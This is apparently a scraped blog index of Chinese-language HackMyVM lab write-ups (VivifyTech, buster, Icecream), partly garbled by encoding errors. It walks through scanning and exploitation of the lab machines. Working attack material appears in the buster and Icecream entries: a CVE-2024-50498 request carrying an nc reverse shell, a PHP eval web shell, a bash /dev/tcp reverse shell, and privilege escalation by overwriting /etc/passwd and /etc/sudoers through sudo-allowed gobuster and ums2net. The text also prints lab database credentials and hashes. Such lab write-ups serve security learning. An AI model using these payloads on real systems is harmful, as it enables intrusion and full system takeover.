â””â”€$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining) Nmap scan report for 192.168.64.23 Host is up (0.00098s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0) | ssh-hostkey: | 256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA) |_ 256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Apache2 Debian Default Page: It works 3306/tcp open mysql MySQL (unauthorized) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\" | HY000 | oracle-tns: | Invalid message-frame.\" |_ HY000 æ‰«ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirb http://192.168.64.23 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Feb 17 11:52:06 2025 URL_BASE: http://192.168.64.23/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.64.23/ ---- + http://192.168.64.23/index.html (CODE:200|SIZE:10701) + http://192.168.64.23/server-status (CODE:403|SIZE:278) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/ ---- Entering directory: http://192.168.64.23/wordpress/ ---- + http://192.168.64.23/wordpress/index.php (CODE:301|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-includes/ + http://192.168.64.23/wordpress/xmlrpc.php (CODE:405|SIZE:42) ---- Entering directory: http://192.168.64.23/wordpress/wp-admin/ ---- + http://192.168.64.23/wordpress/wp-admin/admin.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/css/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/images/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/includes/ + http://192.168.64.23/wordpress/wp-admin/index.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/js/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/maint/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/network/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/user/ ---- Entering directory: http://192.168.64.23/wordpress/wp-content/ ---- + http://192.168.64.23/wordpress/wp-content/index.php (CODE:200|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/plugins/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/themes/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/upgrade/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/uploads/ ---- Entering directory: http://192.168.64.23/wordpress/wp-includes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.64.23/wordpress/wp-admin/css/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.64.23/wor","date":"2025-02-18","objectID":"/vuln_hmv5/:1:2","tags":["æ¸—é€"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["é¶åœº"],"content":"åå¼¹shell æœ‰wpç½‘ç«™ï¼Œwpscanæ‰«ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ wpscan --url http://192.168.64.23/wordpress --api-token=* -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.27 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.64.23/wordpress/ [192.168.64.23] [+] Started: Mon Feb 17 13:00:58 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.57 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.64.23/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://192.168.64.23/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://192.168.64.23/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://192.168.64.23/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11). | Found By: Rss Generator (Passive Detection) | - http://192.168.64.23/wordpress/index.php/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=6.7.2\u003c/generator\u003e | - http://192.168.64.23/wordpress/index.php/comments/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=6.7.2\u003c/generator\u003e [+] WordPress theme in use: twentytwentyfour | Location: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0' [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u003c==\u003e (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] sancelisso | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://192.168.64.23/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 2 | Requests Remaining: 21 [+] Finished: Mon Feb 17 13:01:08 2025 [+] Requests Done: 57 [+] Cached Requests: 6 [+] Data Sent: 16.279 KB [+] Data Received: 358.677 KB [","date":"2025-02-18","objectID":"/vuln_hmv5/:1:3","tags":["æ¸—é€"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["é¶åœº"],"content":"buster ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:0","tags":["æ¸—é€"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=buster ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:1","tags":["æ¸—é€"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ æ‰«å‡ºæ¥80ç«¯å£ï¼Œæ‰“å¼€å‘ç°æ˜¯wordpress wpscanæ‰«å‡ºæ¥ä¸¤ä¸ªç”¨æˆ·ï¼Œç»§ç»­æ‰«æ ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:2","tags":["æ¸—é€"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["é¶åœº"],"content":"åå¼¹shell wpscan â€“api-token â€“url http://192.168.64.20/ -e u,ap â€“plugins-detection aggressive æ‰«å‡ºæ¥æ¼æ´æ’ä»¶wp-query-consoleï¼ŒCVE-2024-50498 poc POST /wp-json/wqc/v1/query HTTP/1.1 Host: kubernetes.docker.internal User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console Content-Type: application/json Content-Length: 45 Origin: http://kubernetes.docker.internal Connection: keep-alive Priority: u=0 {\"queryArgs\":\"phpinfo();\",\"queryType\":\"post\"} æ”¹æˆjosnæ ¼å¼ï¼Œbpå‘è¿‡å» çœ‹ä¸€ä¸‹è¢«ç¦ç”¨çš„ disable_functionspassthru,exec,system,popen,chroot,scandir,chgrp,chown,escapeshpassthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh shell_execå¯ä»¥è¯•è¯• POST /wp-json/wqc/v1/query HTTP/1.1 Host: 192.168.64.20 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 83 {\"queryArgs\":\"shell_exec('nc -e /bin/bash 192.168.64.3 4444');\",\"queryType\":\"post\"} æœ¬åœ°æˆåŠŸæ‹¿åˆ°shellï¼Œå¼€å§‹ææƒ ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:3","tags":["æ¸—é€"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["é¶åœº"],"content":"ææƒ /usr/bin/script -qc /bin/bash /dev/nulläº¤äº’å¼ç»ˆç«¯ wp-config.phpçœ‹çœ‹è´¦å·å¯†ç  // ** Database settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** Database username */ define( 'DB_USER', 'll104567' ); /** Database password */ define( 'DB_PASSWORD', 'thehandsomeguy' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); æŸ¥æ•°æ®åº“ï¼Œå¾—åˆ°å¯†ç  ta0 - $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. welcome - $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ çˆ†å‡ºæ¥welcomeçš„å¯†ç ï¼Œ104567ï¼Œta0çš„çˆ†äº†å¥½ä¹…æ²¡å‡ºæ¥ sshä¸Šå»ä¹‹åå‘ç°sudo -lå‘ç°gobusterå¯ä»¥sudoæ— å¯†ç æ‰§è¡Œï¼Œè¿™ä¸ªå°±æ˜¯ææƒç‚¹ ä¼ ä¸ªpspyä¸Šå»çœ‹çœ‹è¿è¡Œçš„ä¸œè¥¿ï¼Œå‘ç°/opt/.test.shåœ¨åå°è¿è¡Œï¼Œåˆ©ç”¨è¿™ä¸ªææƒï¼Œä½†æ˜¯ä¸ä¼šï¼ˆï¼‰ã€‚ çœ‹äº†ä½¬çš„wpï¼Œæœ‰ä¸€ä¸ªgobusterçš„é€šæ€ææƒæ–¹æ³•ï¼Ÿ perl -e 'print crypt(\"1\",\"aa\")' cat a.py from flask import Flask, Response app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/\u003cpath:path\u003e') def catch_all(path): if len(path) == 36: return Response(status=404) else: return Response(status=200) if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=80) python a.py * Serving Flask app 'a' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.64.3:80 Press CTRL+C to quit #é¶æœº echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' \u003e aaa sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd cat /etc/passwd su - /aaa ç„¶åå°±ææƒæˆåŠŸäº† ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:4","tags":["æ¸—é€"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["é¶åœº"],"content":"hmv_Icecream ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:0","tags":["æ¸—é€"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Icecream ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:1","tags":["æ¸—é€"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â””â”€$ nmap -sV -sC -T4 -Pn -p- 192.168.64.22 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 16:05 HKT Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 60.00% done; ETC: 16:06 (0:00:07 remaining) Nmap scan report for 192.168.64.22 Host is up (0.00048s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA) |_ 256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519) 80/tcp open http nginx 1.22.1 |_http-title: 403 Forbidden |_http-server-header: nginx/1.22.1 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 9000/tcp open cslistener? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Not Found | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 40 | Connection: close | \"error\": \"Value doesn't exist.\" | GetRequest: | HTTP/1.1 200 OK | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 1042 | Connection: close | \"certificates\": {}, | \"js_modules\": {}, | \"config\": { | \"listeners\": {}, | \"routes\": [], | \"applications\": {} | \"status\": { | \"modules\": { | \"python\": { | \"version\": \"3.11.2\", | \"lib\": \"/usr/lib/unit/modules/python3.11.unit.so\" | \"php\": { | \"version\": \"8.2.18\", | \"lib\": \"/usr/lib/unit/modules/php.unit.so\" | \"perl\": { | \"version\": \"5.36.0\", | \"lib\": \"/usr/lib/unit/modules/perl.unit.so\" | \"ruby\": { | \"version\": \"3.1.2\", | \"lib\": \"/usr/lib/unit/modules/ruby.unit.so\" | \"java\": { | \"version\": \"17.0.11\", | \"lib\": \"/usr/lib/unit/modules/java17.unit.so\" | \"wasm\": { | \"version\": \"0.1\", | \"lib\": \"/usr/lib/unit/modules/wasm.unit.so\" | HTTPOptions: | HTTP/1.1 405 Method Not Allowed | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 35 | Connection: close |_ \"error\": \"Invalid method.\" 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9000-TCP:V=7.94SVN%I=7%D=2/10%Time=67A9B363%P=aarch64-unknown-linux SF:-gnu%r(GetRequest,4A8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Unit/1\\.33\\ SF:.0\\r\\nDate:\\x20Mon,\\x2010\\x20Feb\\x202025\\x2008:05:55\\x20GMT\\r\\nContent- SF:Type:\\x20application/json\\r\\nContent-Length:\\x201042\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n{\\r\\n\\t\\\"certificates\\\":\\x20{},\\r\\n\\t\\\"js_modules\\\":\\x20{} SF:,\\r\\n\\t\\\"config\\\":\\x20{\\r\\n\\t\\t\\\"listeners\\\":\\x20{},\\r\\n\\t\\t\\\"routes\\\": SF:\\x20\\[\\],\\r\\n\\t\\t\\\"applications\\\":\\x20{}\\r\\n\\t},\\r\\n\\r\\n\\t\\\"status\\\":\\x SF:20{\\r\\n\\t\\t\\\"modules\\\":\\x20{\\r\\n\\t\\t\\t\\\"python\\\":\\x20{\\r\\n\\t\\t\\t\\t\\\"ver SF:sion\\\":\\x20\\\"3\\.11\\.2\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/unit/modules SF:/python3\\.11\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"php\\\":\\x20{\\r\\n\\t\\t SF:\\t\\t\\\"version\\\":\\x20\\\"8\\.2\\.18\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/uni SF:t/modules/php\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"perl\\\":\\x20{\\r\\n\\t SF:\\t\\t\\t\\\"version\\\":\\x20\\\"5\\.36\\.0\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/u SF:nit/modules/perl\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"ruby\\\":\\x20{\\r\\ SF:n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"3\\.1\\.2\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib SF:/unit/modules/ruby\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"java\\\":\\x20{\\ SF:r\\n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"17\\.0\\.11\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr SF:/lib/unit/modules/java17\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"wasm\\\": SF:\\x20{\\r\\n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"0\\.1\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/us SF:r/lib/unit/modules/wasm\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\")%r(HTTPOpt SF:ions,C7,\"HTTP/1\\.1\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nServer:\\x20Uni SF:t/1\\.33\\.0\\r\\nDate:\\x20Mon,\\x2010\\x20Feb\\x202025\\x2008:05:55\\x20GMT\\r\\n SF:Content-Type:\\x20application/json\\r\\nContent-Length:\\x2035\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n{\\r\\n\\t\\\"error\\\":\\x20\\\"Inv","date":"2025-02-16","objectID":"/vuln_hmv3/:1:2","tags":["æ¸—é€"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["é¶åœº"],"content":"åå¼¹shell çœ‹çœ‹smbæœåŠ¡ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ smbclient -L 192.168.64.22 Password for [WORKGROUP\\kali]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers icecream Disk tmp Folder IPC$ IPC IPC Service (Samba 4.17.12-Debian) nobody Disk Home Directories Reconnecting with SMB1 for workgroup listing. smbXcli_negprot_smb1_done: No compatible protocol selected by server. Protocol negotiation to server 192.168.64.22 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available å‘ç°ç”¨æˆ·icecream ç›´æ¥å¾€å…±äº«ç›®å½•é‡Œé¢å¡ä¸€å¥è¯æœ¨é©¬ \u003c?php eval($_GET[cmd]);?\u003e curlä¸€ä¸‹çœ‹çœ‹æ•ˆæœ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ curl \"http://192.168.64.22/shell.php?cmd=id\" uid=33(www-data) gid=33(www-data) groups=33(www-data) å¼¹shell(è®°å¾—urlç¼–ç ä¸€ä¸‹) curl \"http://192.168.64.22/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.64.3%2F4444%200%3E%261%22\" æœ¬åœ°ç›‘å¬ä¸€ä¸‹ï¼Œ www-data@icecream:/tmp$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin sshd:x:102:65534::/run/sshd:/usr/sbin/nologin ice:x:1000:1000:ice,,,:/home/ice:/bin/bash unit:x:999:995:unit user:/nonexistent:/bin/false å¥½åƒæ²¡æœ‰ç”¨ï¼Œsudo -lä¹Ÿæ²¡æœ‰ï¼Œæ€è·¯æ–­äº†ï¼Œæƒ³èµ·æ¥nmapçš„æ—¶å€™è¿˜æœ‰å…¶ä»–çš„ç«¯å£ 9000ç«¯å£è¿”å› certificates {} js_modules {} config listeners {} routes [] applications {} status modules python version \"3.11.2\" lib \"/usr/lib/unit/modules/python3.11.unit.so\" php version \"8.2.18\" lib \"/usr/lib/unit/modules/php.unit.so\" perl version \"5.36.0\" lib \"/usr/lib/unit/modules/perl.unit.so\" ruby version \"3.1.2\" lib \"/usr/lib/unit/modules/ruby.unit.so\" java version \"17.0.11\" lib \"/usr/lib/unit/modules/java17.unit.so\" wasm version \"0.1\" lib \"/usr/lib/unit/modules/wasm.unit.so\" wasm-wasi-component version \"0.1\" lib \"/usr/lib/unit/modules/wasm_wasi_component.unit.so\" connections accepted 0 active 0 idle 0 closed 0 requests total 0 applications {} gptè·Ÿæˆ‘è¯´è¿™æ˜¯NGINX Unitçš„è¾“å‡ºï¼Œhttps://unit.nginx.org/controlapi/ è¿™æ˜¯è¿™ä¸ªæœåŠ¡çš„å®˜ç½‘ï¼ŒæŸ¥åå°è¿›ç¨‹ï¼Œè¿™ä¸ªæœåŠ¡æ˜¯iceçš„ï¼Œé‚£ä¹ˆå°±æ˜¯é€šè¿‡è¿™ä¸ªææƒåˆ°iceäº† gptç›´æ¥å‘Šè¯‰æˆ‘payloadäº†ï¼ˆï¼‰ PUT /config/applications HTTP/1.1 Host: 192.168.64.22:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept-Encoding: gzip, deflate Content-Type: application/json Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 DNT: 1 x-real-ip: Papa Content-Length: 73 { \"blogs\": { \"type\": \"php\", \"processes\": 20, \"root\": \"/tmp/shell.php\" } } æœ¬åœ°å†™ä¸€ä¸ªconfig.json { \"listeners\": { \"*:8088\": { \"application\": \"blogs\" } }, \"applications\": { \"blogs\": { \"type\": \"php\", \"processes\": 20, \"root\": \"/tmp\" } } } ç„¶å curl -X PUT -d @config.json http://192.168.64.22:9000/config { \"success\": \"Reconfiguration done.\" } ç„¶åè®¿é—®8088/shell.php å¹¶ä¸”åå¼¹shell è¿™ä¸ªæ—¶å€™å°±æ˜¯iceäº†ï¼ˆåŸç†æˆ‘æ…¢æ…¢ç ”ç©¶ï¼‰ï¼Œç°åœ¨æ˜¯æœ€å–œæ¬¢çš„ææƒé˜¶æ®µ ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:3","tags":["æ¸—é€"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["é¶åœº"],"content":"ææƒ ice@icecream:/tmp$ sudo -l sudo -l Matching Defaults entries for ice on icecream: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User ice may run the following commands on icecream: (ALL) NOPASSWD: /usr/sbin/ums2net ums2netçš„githubé¡µé¢æ˜¯è¿™æ ·æè¿°çš„ ums2net provides a way for a user to connect from a network connection to a USB mass storage device. How to use ums2net Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device. Create a config file base on the above path. Please see the config file format section. Run \"ums2net -c \". ums2net will become a daemon in the background. For debugging please add \"-d\" option to avoid detach. Use nc to write your image to the USB Mass Storage device. For example, \"nc -N localhost 29543 \u003c warp7.img\" æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ums2net -cæ¥ææƒï¼Œé¦–å…ˆæˆ‘ä»¬è¦å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ—¢ç„¶ä»–å¯ä»¥å®ˆæŠ¤è¿›ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç«¯å£å»å†™å…¥ã€‚ ç¬¬ä¸€ç§æ–¹æ³•ï¼ŒæŠŠrootå¯†ç è¦†ç›–ä¸ºæ—  æœ¬åœ° â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ echo \"root::0:0:root:/root:/usr/bin/bash\" \u003e tmp nc 192.168.64.22 23456 \u003c tmp è¿œç¨‹ ice@icecream:/tmp$ echo \"23456 of=/etc/passwd\" \u003e config echo \"23456 of=/etc/passwd\" \u003e config ice@icecream:/tmp$ sudo /usr/sbin/ums2net -c config -d sudo /usr/sbin/ums2net -c config -d /etc/sudoers:2:11: error de sintaxis with the 'visudo' command as root. ^~~~~~~~ ums2net[1282]: Totally write 35 bytes to /etc/passwd ice@icecream:/tmp$ su su id uid=0(root) gid=0(root) grupos=0(root) æ–¹æ³•äºŒè¦†ç›–sudoersæ–‡ä»¶ï¼ˆè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œä¸€äº›ä½¬æ˜¯ç›´æ¥ç”¨çš„ï¼Œä¸€äº›æ˜¯è¯•å‡ºæ¥çš„ï¼‰ æˆ‘æ„Ÿè§‰ä¸»è¦æ˜¯å› ä¸º å½“ç”¨æˆ·æ‰§è¡Œsudoæ—¶ï¼Œç³»ç»Ÿä¼šä¸»åŠ¨å¯»æ‰¾/etc/sudoersæ–‡ä»¶ï¼Œåˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æ‰§è¡Œsudoçš„æƒé™ â€“\u003eç¡®è®¤ç”¨æˆ·å…·æœ‰å¯æ‰§è¡Œsudoçš„æƒé™åï¼Œè®©ç”¨æˆ·è¾“å…¥ç”¨æˆ·è‡ªå·±çš„å¯†ç ç¡®è®¤ â€“\u003eè‹¥å¯†ç è¾“å…¥æˆåŠŸï¼Œåˆ™å¼€å§‹æ‰§è¡Œsudoåç»­çš„å‘½ä»¤ è¿œç¨‹ echo \"8889 of=/etc/sudoers\" \u003e config sudo /usr/sbin/ums2net -c config -d æœ¬åœ° echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc 192.168.64.22 8889 è¿œç¨‹ su ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:4","tags":["æ¸—é€"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["CTF"],"content":"å‰è¨€ 